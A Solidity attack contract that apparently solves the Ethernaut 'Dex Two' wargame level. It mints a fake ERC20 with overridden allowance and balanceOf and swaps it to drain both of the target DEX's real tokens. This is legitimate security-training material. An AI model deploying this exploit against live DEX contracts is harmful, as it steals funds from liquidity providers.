// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./interfaces/IDexTwo.sol";
import "./interfaces/ISwappableTokenTwo.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

/**
 * @title Dex Two Attack (Ethernaut Challenge Level 23 - Dex Two)
 * @author Emre Tepe (@emretepedev)
 * @notice Attack contract for level 23
 * @custom:ethernaut https://ethernaut.openzeppelin.com/level/0x5026Ff8C97303951c255D3a7FDCd5a1d0EF4a81a
 */
contract DexTwoAttack is ERC20 {
    IDexTwo private immutable target;

    /**
     * @param target_ Address of target contract
     */
    constructor(IDexTwo target_) ERC20("DexTwo", "DT") {
        _mint(address(this), 2 * target_.balanceOf(target_.token2(), address(target_)));

        target = target_;
    }

    /*//////////////////////////////////////////////////////////////
                                Attack
    //////////////////////////////////////////////////////////////*/

    /**
     * @notice Attack and solve the level
     */
    function attack() external {
        ISwappableTokenTwo[2] memory tokens = [
            ISwappableTokenTwo(target.token1()),
            ISwappableTokenTwo(target.token2())
        ];

        for (uint256 i; i < tokens.length; ) {
            target.swap(address(this), address(tokens[i]), tokens[i].balanceOf(address(target)));

            require(0 == tokens[i].balanceOf(address(target)), "DexTwo: Attack failed");

            unchecked {
                ++i;
            }
        }
    }

    /*//////////////////////////////////////////////////////////////
                            Helpers & Others
    //////////////////////////////////////////////////////////////*/

    function allowance(
        address, /* owner */
        address /* spender */
    ) public pure override returns (uint256) {
        return type(uint256).max;
    }

    function balanceOf(
        address /* account */
    ) public view override returns (uint256) {
        return target.balanceOf(target.token2(), msg.sender);
    }
}
